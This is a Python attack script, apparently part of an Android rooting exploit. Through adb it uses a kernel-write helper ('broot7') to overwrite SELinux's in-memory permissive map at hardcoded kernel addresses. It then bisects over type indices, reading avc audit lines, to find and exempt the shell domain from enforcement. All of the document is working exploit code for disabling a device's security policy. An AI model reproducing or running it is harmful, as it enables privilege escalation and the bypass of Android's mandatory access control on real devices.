#!/usr/bin/env python3
"""Measure the LIVE type index of the shell domain by functional bisection.

Why measure instead of read a file: planting bit 1083 (what tools/policy_types.py gets out of the
ROM's own /sepolicy) changes nothing, while planting all 1536 bits does (ledger 545) -- so the loaded
policy's numbering is not the file's, and the number has to be measured.

Oracle design, and why it survives the avc cache:
  editing the map in RAM does NOT flush the avc cache (only a policy load resets it), so a repeated
  (ssid,tsid,tclass,perm) query keeps returning the cached node.  A fresh tsid is cheap: probe a path
  whose label no earlier step used.  And the read-out is the audit line itself -- a permissive domain
  logs `denied ... permissive=1` while it lets the operation through, a plain denial logs
  `permissive=0`, and a policy-allowed operation logs nothing (that step is then inconclusive and the
  next candidate path is used).
"""
import struct, subprocess, sys, time

HEAD = 0xffffffc001d61248
NODE = 0xffffffc001a41c00
ADB = "adb shell".split()

# each step: paths with distinct labels, tried in order until one produces an avc line
PATHS = [
    "/data/misc/bluedroid", "/data/anr", "/data/property", "/data/system/inputmethod",
    "/mnt/expand", "/oem", "/persist", "/cust", "/preload", "/vendor/etc",
    "/system/framework", "/data/data", "/data/secure", "/data/backup", "/data/local/tmp/.sud",
    "/dev/binder", "/dev/socket", "/dev/log", "/sys/fs/selinux", "/system/etc/snd_soc",
    "/data/dalvik-cache", "/data/media", "/storage", "/mnt/asec", "/acct",
    "/data/misc/wifi", "/data/misc/location", "/data/misc/bluetooth", "/data/system/packages.list",
    "/data/local", "/dev/graphics", "/dev/input", "/sys/kernel/debug", "/system/lib64",
    "/vendor/lib64", "/vendor/firmware", "/data/tombstones", "/data/keep", "/dev/__properties__",
    "/proc/sys", "/sys/power", "/sys/kernel", "/data/adb", "/data/ota", "/oem/app",
    "/system/build.prop", "/vendor/build.prop", "/data/system/dropbox", "/mnt/vendor",
]
# one avc key per pair: (probe perm op, path) -- getattr is the cheap, harmless one
def sh(cmd, t=120):
    return subprocess.run(ADB + [cmd], capture_output=True, text=True, timeout=t).stdout

def dmesg_marks():
    return sh("dmesg | grep -a 'scontext=u:r:shell' | tail -n 40 | sed -e s/.*avc/avc/")

def plant(bits):
    bits = sorted(set(int(b) for b in bits))
    hi = max(bits) if bits else 0
    nwin = (hi // 384) + 1 if bits else 1
    if nwin > 4:
        raise SystemExit("needs more than 4 nodes")
    for i in range(nwin):
        nb = bytearray(64)
        struct.pack_into("<Q", nb, 0, NODE + 64 * (i + 1) if i + 1 < nwin else 0)
        for b in bits:
            if i * 384 <= b < (i + 1) * 384:
                off = b - i * 384
                nb[8 + off // 8] |= 1 << (off % 8)
        struct.pack_into("<I", nb, 0x38, i * 384)
        r = sh(f"cd /data/local/tmp && ./broot7 w {NODE+64*i:x} 64 {bytes(nb).hex()} 20 3>rep.txt >w.log 2>&1; cat rep.txt | tr -d '\\r'").strip()
        if r != "ok":
            raise SystemExit(f"node {i} write: {r}")
    head = struct.pack("<QII", NODE, hi, 0) if bits else struct.pack("<QII", 0, 0, 0)
    r = sh(f"cd /data/local/tmp && ./broot7 w {HEAD:x} 16 {head.hex()} 20 3>rep.txt >w.log 2>&1; cat rep.txt | tr -d '\\r'").strip()
    if r != "ok":
        raise SystemExit(f"head write: {r}")
    return f"planted {len(bits)} bits hi={hi}"

def ask(path):
    """Do one fresh check and report what the kernel logged about it."""
    before = dmesg_marks()
    sh(f"ls -ld {path} >/dev/null 2>&1")
    time.sleep(0.7)
    after = dmesg_marks()
    new = [l for l in after.splitlines() if l.strip() and ('"'+path.split("/")[-1]) in l or path in l or l not in before]
    hits = [l for l in after.splitlines() if ("=" + path) in l or path in l]
    line = hits[-1] if hits else ""
    if "permissive=1" in line:
        return "EXEMPT", line
    if "permissive=0" in line:
        return "DENIED", line
    return "NOISE", (line or "(no matching avc line)")

def interval(bits_lo, bits_hi):
    return list(range(bits_lo, bits_hi + 1))

def find(lo, hi, budget=13):
    """Bisect: at each step plant the lower half of [lo,hi] and ask a fresh path."""
    pi = 0
    while hi - lo > 0 and budget > 0:
        mid = (lo + hi) // 2
        cand = interval(lo, mid)
        print(f"# step: test [{lo}..{mid}] of [{lo}..{hi}]  ({plant(cand)})", flush=True)
        verdict = None
        while pi < len(PATHS):
            v, line = ask(PATHS[pi])
            print(f"    probe {PATHS[pi]} -> {v}", flush=True)
            if v != "NOISE":
                verdict = (v == "EXEMPT")
                pi += 1
                break
            pi += 1
        if verdict is None:
            print("    no usable probe left; abort", flush=True)
            return None
        if verdict:
            hi = mid
        else:
            if mid == hi:
                lo = hi
                break
            lo = mid + 1
        budget -= 1
    return lo

if __name__ == "__main__":
    idx = find(0, 1212)
    print(f"# live shell type index candidate: {idx}", flush=True)
    print(plant([int(sys.argv[1]) if len(sys.argv) > 1 else idx]) if idx else "no result")
    v, line = ask("/data/system/packages.list")
    print(f"confirm probe -> {v}: {line}", flush=True)
